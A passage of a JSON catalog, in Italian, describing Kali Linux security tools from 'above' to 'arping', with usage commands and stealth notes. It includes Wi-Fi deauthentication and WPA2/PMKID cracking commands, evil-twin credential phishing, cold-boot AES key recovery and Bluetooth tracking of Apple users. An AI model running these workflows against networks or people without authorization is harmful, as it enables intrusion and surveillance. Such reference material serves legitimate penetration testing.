    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Above è uno sniffer di rete passivo specializzato nell'intercettazione di protocolli di livello 2 e 3 utilizzati per il network discovery e la gestione infrastrutturale. Cattura e analizza traffico CDP (Cisco Discovery Protocol), LLDP (Link Layer Discovery Protocol), ARP, DHCP e altri protocolli di management, rivelando informazioni critiche sulla topologia di rete, dispositivi connessi, configurazioni VLAN e dettagli hardware che non emergono da scansioni attive tradizionali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Passive Discovery:</strong> Ascolta silenziosamente il traffico broadcast/multicast senza inviare alcun pacchetto, rendendosi completamente invisibile a IDS/IPS e sistemi di monitoraggio. Ideale per reconnaissance in ambienti ad alta sicurezza dove ogni pacchetto anomalo viene analizzato.</p><p><strong>Protocol Analysis:</strong> Decodifica automaticamente CDP e LLDP per estrarre hostname, modelli di dispositivo, versioni firmware, indirizzi IP di management, capabilities (router/switch/phone) e informazioni sulle VLAN native e voice VLAN configurate.</p><p><strong>VLAN Discovery:</strong> Identifica le VLAN in uso sulla rete analizzando i tag 802.1Q e le informazioni DTP (Dynamic Trunking Protocol), permettendo di mappare la segmentazione logica della rete e identificare potenziali target per VLAN hopping.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Above richiede privilegi root per catturare pacchetti raw e un'interfaccia in modalità promiscua.</p><pre><code># Avvio base su interfaccia eth0\nsudo above -i eth0\n\n# Cattura con output dettagliato\nsudo above -i eth0 -v\n\n# Salvataggio risultati su file\nsudo above -i eth0 -o network_discovery.txt</code></pre><p>Lasciare in esecuzione per alcuni minuti permette di catturare gli annunci periodici CDP/LLDP (tipicamente ogni 30-60 secondi).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Network Reconnaissance</strong> interna, Above rivela l'infrastruttura di rete senza generare traffico sospetto: modelli di switch Cisco, versioni IOS, VLAN configurate e indirizzi di management. Per il <strong>VLAN Hopping</strong>, le informazioni raccolte (native VLAN, DTP status) sono prerequisiti essenziali. In contesti di <strong>Physical Pentest</strong>, collegandosi a una porta di rete qualsiasi si ottiene immediatamente visibilità sulla topologia circostante.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Essendo completamente passivo, Above è virtualmente non rilevabile. Non genera traffico e non modifica lo stato dell'interfaccia in modo osservabile remotamente.</p><p><strong>Limitazioni:</strong> Funziona solo su segmenti di rete dove il traffico broadcast/multicast è visibile. Switch configurati senza CDP/LLDP o con port isolation non riveleranno informazioni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "aesfix",
    "name": "aesfix",
    "version": "1.0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/aesfix/",
    "desc": "Recupera chiavi AES corrotte da dump RAM correggendo bit flip tramite analisi key schedule e ridondanza algoritmica.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Aesfix è uno strumento forense specializzato nel recupero di chiavi crittografiche AES da dump di memoria RAM potenzialmente corrotti. Sfrutta la struttura matematica dell'algoritmo AES, in particolare la ridondanza intrinseca nel key schedule (espansione della chiave), per correggere automaticamente errori a singolo bit (bit flip) che possono verificarsi durante l'acquisizione della memoria. Questo è fondamentale in scenari di cold boot attack dove il degrado della RAM può introdurre errori casuali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Correzione Bit Flip:</strong> L'algoritmo analizza le relazioni matematiche tra i round key dell'espansione AES. Poiché ogni round key dipende dal precedente tramite operazioni XOR e S-box, un errore in un byte produce inconsistenze rilevabili e correggibili.</p><p><strong>Supporto Multi-Keysize:</strong> Gestisce chiavi AES-128, AES-192 e AES-256, adattando l'analisi alla struttura specifica di ciascun key schedule.</p><p><strong>Integrazione con Aeskeyfind:</strong> Progettato per lavorare in pipeline con aeskeyfind: quest'ultimo estrae i candidati chiave dalla RAM, aesfix li valida e corregge se necessario.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il tool accetta in input un file contenente una potenziale chiave AES (espansa o meno) e tenta la correzione.</p><pre><code># Correzione chiave AES estratta\naesfix suspected_key.bin corrected_key.bin\n\n# Pipeline tipica con aeskeyfind\naeskeyfind memory.dump | while read key; do\n  echo $key | xxd -r -p > tmp.bin\n  aesfix tmp.bin fixed.bin && echo \"Fixed: $(xxd -p fixed.bin)\"\ndone</code></pre><p>L'output indica se la chiave era valida, corretta con successo, o irrecuperabile (troppi errori).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Essenziale in <strong>Cold Boot Forensics</strong> quando si acquisisce RAM da sistemi con crittografia disco attiva (BitLocker, LUKS, FileVault). Dopo un cold boot attack, i bit flip sono comuni e aesfix permette di recuperare chiavi altrimenti inutilizzabili. Utile anche in <strong>Memory Forensics</strong> generica quando si analizzano dump acquisiti con metodi non perfetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Utilizzo:</strong> Tool puramente offline, opera su file locali. Nessun impatto di rete o rilevamento.</p><p><strong>Limitazioni:</strong> Può correggere solo errori limitati (tipicamente 1-2 bit per blocco). Chiavi con corruzione massiva rimangono irrecuperabili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "aeskeyfind",
    "name": "aeskeyfind",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/aeskeyfind/",
    "desc": "Estrae chiavi AES da dump di memoria RAM cercando schedule di chiavi espanse.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>AESKeyFind è uno strumento forense specializzato nell'estrazione di chiavi di cifratura AES da dump di memoria volatile (RAM). Sfrutta una caratteristica intrinseca dell'algoritmo AES: durante l'uso, le chiavi vengono espanse in \"key schedules\" con pattern matematici riconoscibili. Il tool scansiona il dump cercando questi pattern, permettendo di recuperare chiavi anche da sistemi spenti o da immagini forensi, rendendo possibile la decifratura di volumi cifrati come BitLocker, TrueCrypt o FileVault.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pattern Matching AES:</strong> Ricerca strutture di key schedule a 128, 192 e 256 bit nel dump di memoria. La matematica dell'espansione chiavi AES crea pattern unici che sopravvivono anche a parziale corruzione dei dati.</p><p><strong>Output Chiavi:</strong> Restituisce le chiavi candidate in formato esadecimale, pronte per essere testate su volumi cifrati con tool come <code>aescrypt</code> o integrato in workflow di decifratura forense.</p><p><strong>Velocità:</strong> Ottimizzato per scansionare gigabyte di memoria in pochi secondi, essenziale quando si lavora con dump di server o workstation moderne.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede un file di dump della memoria in formato raw.</p><pre><code># Estrazione chiavi AES da dump\naeskeyfind memory.dmp\n\n# Output verbose con offset\naeskeyfind -v memory.dmp</code></pre><p>Le chiavi trovate devono essere validate provando a decifrare il contenuto target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Digital Forensics</strong>, dopo aver acquisito la RAM di un sistema sospetto (tramite tool come DumpIt o LiME), aeskeyfind permette di recuperare le chiavi di volumi cifrati senza bisogno della password utente. Utile anche nel <strong>Cold Boot Attack</strong>: la RAM mantiene i dati per alcuni secondi dopo lo spegnimento, permettendo il recupero di chiavi da sistemi appena spenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Funziona solo se la chiave era in memoria al momento del dump. Sistemi con protezioni avanzate (es. Secure Boot, virtualization-based security) possono offuscare le chiavi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "aircrack-ng",
    "name": "aircrack-ng",
    "version": "1.7",
    "icon": "../app/icons/aircrack-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/aircrack-ng/",
    "desc": "Suite completa per auditing reti WiFi: cattura pacchetti, deauth, crack WEP/WPA/WPA2.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Aircrack-ng è la suite standard de facto per il penetration testing di reti wireless 802.11. Composta da oltre 20 tool specializzati, copre l'intero ciclo di attacco: dalla messa in monitor mode dell'interfaccia, alla cattura del traffico, all'iniezione di pacchetti per accelerare la raccolta dati, fino al cracking offline delle chiavi WEP/WPA/WPA2. È il fondamento su cui si basano framework più automatizzati come Airgeddon o Wifite.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Airmon-ng:</strong> Configura le schede wireless in monitor mode, prerequisito per la cattura passiva del traffico.</p><p><strong>Airodump-ng:</strong> Scansiona e cattura il traffico wireless, identificando AP, client connessi e raccogliendo handshake WPA/WPA2.</p><p><strong>Aireplay-ng:</strong> Inietta pacchetti per forzare deautenticazioni (cattura handshake) o generare traffico ARP (attacco WEP).</p><p><strong>Aircrack-ng:</strong> Il cracker vero e proprio. Attacca chiavi WEP statisticamente (PTW/FMS) e WPA/WPA2 via dizionario o brute force sugli handshake catturati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Workflow tipico per WPA2:</p><pre><code># Monitor mode con kill interferenze\nairmon-ng check kill &amp;&amp; airmon-ng start wlan0\n\n# Scansione mirata (solo WPA2, esclude 2.4GHz deboli)\nairodump-ng wlan0mon --encrypt WPA2 --wps --manufacturer\n\n# Cattura handshake con output multipli formati\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --output-format pcap,csv,kismet wlan0mon\n\n# Deauth mirato a client specifico (meno rumoroso)\naireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon\n\n# Crack con hashcat (GPU, molto più veloce)\naircrack-ng -j hashcat_format capture-01.cap  # converti\nhashcat -m 22000 hashcat_format.hc22000 rockyou.txt -O -w 3\n\n# PMKID attack (no client needed)\nhcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1\nhcxpcapngtool -o pmkid.hc22000 pmkid.pcapng\nhashcat -m 22000 pmkid.hc22000 wordlist.txt\n\n# WEP attack automatico (se target WEP)\nbesside-ng -b AA:BB:CC:DD:EE:FF wlan0mon</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Essenziale in ogni <strong>Wireless Pentest</strong> per verificare la robustezza delle password WiFi aziendali. Usato anche per <strong>Rogue AP Detection</strong> e per testare la resistenza a attacchi di deautenticazione (DoS wireless).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I pacchetti di deauth sono facilmente rilevabili da WIDS/WIPS. L'iniezione massiva è rumorosa.</p><p><strong>Legalità:</strong> L'uso su reti non autorizzate è illegale in quasi tutte le giurisdizioni.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "airgeddon",
    "name": "airgeddon",
    "version": "11.51",
    "icon": "../app/icons/airgeddon-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/airgeddon/",
    "desc": "Script bash all-in-one per attacchi WiFi: evil twin, WPS, handshake capture, DoS wireless.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Airgeddon è un framework bash che orchestra e semplifica l'uso di decine di tool wireless (aircrack-ng, hostapd, dnsmasq, bettercap, ecc.) attraverso un'interfaccia a menu guidata. Automatizza attacchi complessi come Evil Twin con captive portal, permettendo anche a utenti meno esperti di eseguire penetration test wireless avanzati senza dover memorizzare comandi complessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Evil Twin Attack:</strong> Crea un access point clone con captive portal per phishing delle credenziali WiFi. Include template personalizzabili per diverse lingue e ISP.</p><p><strong>WPS Attacks:</strong> Integra Reaver, Bully e PixieWPS per attacchi a reti con WPS abilitato (PIN brute force e Pixie Dust).</p><p><strong>Handshake Management:</strong> Cattura, pulisce e verifica handshake WPA/WPA2. Supporta il cracking con aircrack-ng, hashcat e dizionari personalizzati.</p><p><strong>DoS Wireless:</strong> Attacchi di deautenticazione mirati o broadcast per denial of service o per forzare la riconnessione dei client.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare lo script e seguire i menu interattivi.</p><pre><code># Avvio\nsudo airgeddon\n\n# Lo script guida attraverso:\n# 1. Selezione interfaccia\n# 2. Messa in monitor mode\n# 3. Scelta tipo di attacco\n# 4. Selezione target\n# 5. Esecuzione automatizzata</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale per <strong>Wireless Pentesting</strong> rapido quando si ha poco tempo per setup manuali. L'Evil Twin è particolarmente efficace in scenari di <strong>Social Engineering</strong> dove la vittima si connette volontariamente al fake AP. Ottimo per dimostrazioni e training sulla sicurezza wireless.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Evil Twin genera un secondo SSID identico, facilmente rilevabile da WIDS. I DoS sono molto visibili.</p><p><strong>Dipendenze:</strong> Richiede molti tool esterni installati (verifica automatica all'avvio).</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "altdns",
    "name": "altdns",
    "version": "1.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/altdns/",
    "desc": "Genera permutazioni di sottodomini e risolve DNS per scoprire host nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Altdns estende la fase di subdomain enumeration generando permutazioni intelligenti dai sottodomini già noti. Se hai trovato <code>dev.example.com</code>, Altdns genererà varianti come <code>dev1</code>, <code>dev-api</code>, <code>staging-dev</code>, <code>devtest</code> e migliaia di altre combinazioni basate su pattern comuni. Poi risolve massivamente queste permutazioni per identificare quali esistono realmente, scoprendo asset che sfuggono ai tool di enumerazione passiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Permutation Engine:</strong> Applica regole di mutazione (prefissi, suffissi, sostituzione numeri, inserimento separatori) ai sottodomini input. Le wordlist di permutazione sono personalizzabili.</p><p><strong>Mass Resolution:</strong> Integra resolver DNS per verificare quali permutazioni generate esistono effettivamente (record A/AAAA).</p><p><strong>Output Filtering:</strong> Esclude automaticamente wildcard DNS per evitare falsi positivi su domini che risolvono qualsiasi query.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede una lista di sottodomini già scoperti e una wordlist di permutazioni.</p><pre><code># Pipeline completa: subfinder -&gt; altdns -&gt; resolution -&gt; probe\nsubfinder -d target.com -silent | tee known.txt\naltdns -i known.txt -o permuted.txt -w /usr/share/altdns/words.txt\nmassdns -r resolvers.txt -t A -o S permuted.txt | grep -v NXDOMAIN &gt; resolved.txt\ncat resolved.txt | cut -d' ' -f1 | httprobe | tee live_hosts.txt\n\n# Generazione massiva con wordlist custom\naltdns -i known.txt -o mega_permuted.txt -w custom_devops_words.txt -t 50\n\n# Filtro duplicati e wildcards\naltdns -i known.txt -o permuted.txt -w words.txt -r -s resolved.txt\ncat resolved.txt | sort -u | grep -v \"\\*\" &gt; clean_resolved.txt\n\n# Integrazione nuclei per vuln scan\ncat clean_resolved.txt | nuclei -t cves/ -t exposures/ -o vulns.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Asset Discovery</strong>, dopo una prima enumerazione con Amass o Subfinder, Altdns trova i \"cugini\" dei sottodomini noti. Spesso scopre ambienti di sviluppo, staging o backup dimenticati che espongono vulnerabilità non presenti in produzione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera un volume enorme di query DNS. Usare resolver pubblici o distribuire le query per evitare rate limiting.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "amass",
    "name": "amass",
    "version": "4.2.0",
    "icon": "../app/icons/amass-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/amass/",
    "desc": "Enumerazione sottodomini avanzata con OSINT, brute force, scraping e graph mapping.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>OWASP Amass è il tool più completo per la mappatura della superficie d'attacco esterna. Combina tecniche passive (Certificate Transparency, API di terze parti, web scraping) con enumerazione attiva (DNS brute force, zone transfer) per costruire un grafo completo dei sottodomini e delle relazioni di un'organizzazione. Il database integrato permette di tracciare i cambiamenti nel tempo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enum Mode:</strong> Enumerazione completa che combina oltre 50 fonti di dati (VirusTotal, Shodan, SecurityTrails, ecc.) con risoluzione DNS e brute forcing.</p><p><strong>Intel Mode:</strong> Raccoglie informazioni sull'organizzazione (ASN, netblock, WHOIS) per scoprire domini correlati non ovvi.</p><p><strong>Graph Database:</strong> Salva tutti i risultati in un database a grafo, permettendo query complesse sulle relazioni tra asset e visualizzazione con tool come Maltego.</p><p><strong>Tracking:</strong> Confronta scan successivi per identificare nuovi asset o modifiche all'infrastruttura.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Configurare le API key nel file config per massimizzare i risultati.</p><pre><code># Enumerazione completa con tutte le fonti e config\namass enum -d target.com -config ~/.config/amass/config.ini -o results.txt -dir amass_output/\n\n# Passive + brute con ASN scope (per grandi org)\namass intel -org \"Target Inc\" -asn 12345 -d target.com\namass enum -passive -d target.com -src -ip -dir ./amass/\n\n# Brute force con alterazioni e resolver custom\namass enum -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \\\n  -d target.com -rf resolvers.txt -wm -aw words.txt -max-dns-queries 200\n\n# Tracking cambiamenti (confronta con scan precedenti)\namass track -d target.com -dir ./amass/\n\n# Grafo D3.js interattivo + export Maltego\namass viz -d3 -dir ./amass/\namass viz -maltego -dir ./amass/ -o maltego_import.csv\n\n# Pipeline completa automatizzata\namass enum -d target.com -o subs.txt &amp;&amp; \\\n  cat subs.txt | httpx -silent | nuclei -t cves/ -o vulns.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Pilastro di ogni fase di <strong>Reconnaissance</strong>. Per <strong>Bug Bounty</strong>, Amass è spesso il primo tool lanciato per mappare lo scope. Nella <strong>Threat Intelligence</strong>, permette di monitorare l'espansione dell'infrastruttura di gruppi criminali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La modalità attiva genera traffico DNS sostanziale. La modalità passiva è completamente stealth.</p><p><strong>Rate Limiting:</strong> Senza API key, molte fonti limiteranno le query.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "apktool",
    "name": "apktool",
    "version": "2.7.0",
    "icon": "../app/icons/apktool-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/apktool/",
    "desc": "Decompila e ricompila APK Android, permettendo analisi e modifica del codice smali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Apktool è lo strumento fondamentale per il reverse engineering di applicazioni Android. Permette di decompilare un file APK nei suoi componenti originali: codice smali (assembly Dalvik), risorse, manifest e file di configurazione. Dopo l'analisi o la modifica, può ricompilare il tutto in un APK funzionante. È essenziale per l'analisi di malware mobile, la ricerca di vulnerabilità e il modding di applicazioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decompilazione:</strong> Estrae tutte le risorse (immagini, layout XML, stringhe) nel formato originale e converte il bytecode DEX in codice smali leggibile.</p><p><strong>Ricompilazione:</strong> Riassembla i file modificati in un APK valido, gestendo automaticamente la compressione e la struttura corretta.</p><p><strong>Framework Management:</strong> Gestisce i framework di sistema necessari per decompilare app che dipendono da risorse OEM specifiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Decompilazione APK\napktool d target.apk -o output_dir\n\n# Ricompilazione dopo modifica\napktool b output_dir -o modified.apk\n\n# Installazione framework (per app di sistema)\napktool if framework-res.apk</code></pre><p>Dopo la ricompilazione, l'APK deve essere firmato con <code>apksigner</code> o <code>jarsigner</code> per essere installabile.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Mobile Pentesting</strong>, permette di analizzare il codice per trovare hardcoded secrets, API key esposte o logica vulnerabile. Nell'<strong>Analisi Malware</strong>, consente di esaminare il comportamento di app sospette. Per <strong>Bug Bounty</strong>, è il primo passo per analizzare app Android alla ricerca di vulnerabilità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Non decompila in Java ma in smali (più difficile da leggere). Per codice Java, usare jadx. App con protezioni (ProGuard, DexGuard) producono codice offuscato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "apple-bleee",
    "name": "apple-bleee",
    "version": "0.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/apple-bleee/",
    "desc": "Sfrutta vulnerabilità BLE di dispositivi Apple per estrarre numeri di telefono e info.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Apple-bleee sfrutta le debolezze nei protocolli BLE (Bluetooth Low Energy) proprietari di Apple per estrarre informazioni sensibili dai dispositivi iOS e macOS nelle vicinanze. I dispositivi Apple trasmettono costantemente pacchetti BLE per funzionalità come AirDrop, Handoff e Wi-Fi Password Sharing, contenenti hash parziali di numeri di telefono ed email che possono essere correlati per de-anonimizzare gli utenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Phone Number Extraction:</strong> Cattura gli hash SHA256 troncati dei numeri di telefono trasmessi durante le richieste AirDrop. Con un attacco di forza bruta (spazio limitato dei numeri), è possibile recuperare il numero completo.</p><p><strong>Device Tracking:</strong> Monitora i messaggi BLE per tracciare la presenza e i movimenti di dispositivi Apple specifici, anche quando il WiFi è disattivato.</p><p><strong>Status Detection:</strong> Determina lo stato del dispositivo (schermo acceso/spento, chiamata in corso, batteria in carica) dai pacchetti broadcast.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede un adattatore Bluetooth compatibile con modalità monitor BLE.</p><pre><code># Scansione dispositivi Apple nelle vicinanze\npython3 ble_read_state.py\n\n# Estrazione hash numeri telefono (AirDrop)\npython3 airdrop_leak.py</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di <strong>Physical Pentesting</strong>, permette di identificare dipendenti target tramite i loro dispositivi Apple prima di un attacco di social engineering. Utile nella <strong>Threat Intelligence</strong> per tracciare persone di interesse in aree pubbliche. Dimostra i rischi della trasmissione BLE continua per <strong>Privacy Awareness</strong>.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> L'intercettazione di comunicazioni Bluetooth può violare leggi sulla privacy in molte giurisdizioni. Usare solo con autorizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "armitage",
    "name": "armitage",
    "version": "20221206",
    "icon": "../app/icons/armitage-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/armitage/",
    "desc": "GUI per Metasploit che visualizza target, sessioni e facilita attacchi collaborativi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Armitage è un'interfaccia grafica per Metasploit Framework che semplifica la gestione di penetration test complessi. Visualizza la rete target come un grafo interattivo, permette di lanciare exploit con pochi click e gestisce sessioni multiple simultaneamente. Include funzionalità di team server per operazioni collaborative dove più pentester lavorano sullo stesso engagement.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Network Visualization:</strong> Rappresenta graficamente gli host scoperti, colorandoli in base al sistema operativo e allo stato di compromissione.</p><p><strong>Attack Automation:</strong> La funzione \"Hail Mary\" lancia automaticamente tutti gli exploit applicabili contro i target selezionati, utile per demo o CTF.</p><p><strong>Session Management:</strong> Gestisce shell Meterpreter e command shell con interfaccia tabbed, facilitando il pivoting e il post-exploitation su molti host.</p><p><strong>Team Collaboration:</strong> Il team server permette a più operatori di condividere sessioni, log e finding in tempo reale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio database e RPC\nmsfdb init && msfconsole -x \"load msgrpc Pass=password\"\n\n# Avvio Armitage (connessione automatica)\narmitage</code></pre><p>Una volta connesso, usare Hosts > Nmap Scan per discovery, poi click destro sugli host per esplorare exploit disponibili.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Eccellente per <strong>Formazione</strong> e dimostrazione di concetti di exploitation a chi non conosce la CLI di Metasploit. In <strong>CTF</strong> e lab, la funzione Hail Mary accelera la fase di exploitation. Per <strong>Team Engagement</strong>, la modalità collaborativa facilita la coordinazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Hail Mary è estremamente rumoroso. Per engagement reali, preferire l'uso manuale mirato della CLI di Metasploit.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "arp-scan",
    "name": "arp-scan",
    "version": "1.10.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/arp-scan/",
    "desc": "Scansiona reti locali via ARP per scoprire host attivi e MAC address.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Arp-scan è uno strumento di discovery di rete veloce e affidabile che utilizza il protocollo ARP per identificare tutti gli host attivi su una rete locale. A differenza delle scansioni IP/ICMP, ARP opera a livello 2 e non può essere bloccato da firewall host-based, garantendo la scoperta di tutti i dispositivi connessi al segmento di rete, inclusi quelli \"stealth\" che non rispondono ai ping.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Layer 2 Discovery:</strong> Invia ARP request e raccoglie le risposte per mappare IP a MAC address. Funziona anche su host con firewall attivo.</p><p><strong>Vendor Identification:</strong> Correla i MAC address al database OUI (Organizationally Unique Identifier) per identificare il produttore del dispositivo.</p><p><strong>Custom Ranges:</strong> Supporta la scansione di range specifici, liste di IP o intere subnet in formato CIDR.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione rete locale (auto-detect interfaccia)\nsudo arp-scan --localnet\n\n# Scansione subnet specifica\nsudo arp-scan 192.168.1.0/24\n\n# Scansione con interfaccia specifica\nsudo arp-scan -I eth0 10.0.0.0/24</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Primo passo in ogni <strong>Internal Network Pentest</strong> per enumerare rapidamente tutti gli host nella VLAN. Utile per identificare dispositivi IoT, stampanti e altri apparati che potrebbero non rispondere a scansioni TCP/IP. Per <strong>Network Inventory</strong>, fornisce una lista completa di MAC/IP/Vendor.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste ARP sono traffico normale, ma un burst massivo può essere notato. Funziona solo sulla stessa VLAN (no routing).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "arping",
    "name": "arping",
    "version": "2.26",
    "icon": "../app/icons/arping-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/arping/",
    "desc": "Ping ARP per verificare host attivi in rete locale, bypassa firewall IP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Arping è l'equivalente ARP del comando ping ICMP. Invia richieste ARP a un indirizzo IP specifico e attende la risposta, permettendo di verificare se un host è attivo sulla rete locale anche quando blocca i ping ICMP. È utile anche per rilevare conflitti IP (due host con lo stesso IP) e per identificare il MAC address di un host target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Host Detection:</strong> Verifica la presenza di un host a livello 2, bypassing firewall che bloccano ICMP.</p><p><strong>MAC Resolution:</strong> Restituisce il MAC address associato all'IP target, utile per identificare il dispositivo.</p><p><strong>Duplicate IP Detection:</strong> Rileva se più host rispondono allo stesso IP, indicando un conflitto o potenziale attacco ARP spoofing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Ping ARP singolo host\nsudo arping 192.168.1.1\n\n# Con count limitato\nsudo arping -c 5 192.168.1.1\n\n# Specificando interfaccia\nsudo arping -I eth0 192.168.1.1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Troubleshooting</strong>, verifica la raggiungibilità L2 di host che non rispondono a ping. Per <strong>Security Audit</strong>, rileva configurazioni duplicate o attacchi MITM in corso. Nel <strong>Pentesting</strong>, conferma la presenza di target che hanno ICMP disabilitato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Funziona solo sulla stessa rete broadcast (VLAN). Il traffico ARP ripetuto verso un singolo host può essere notato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
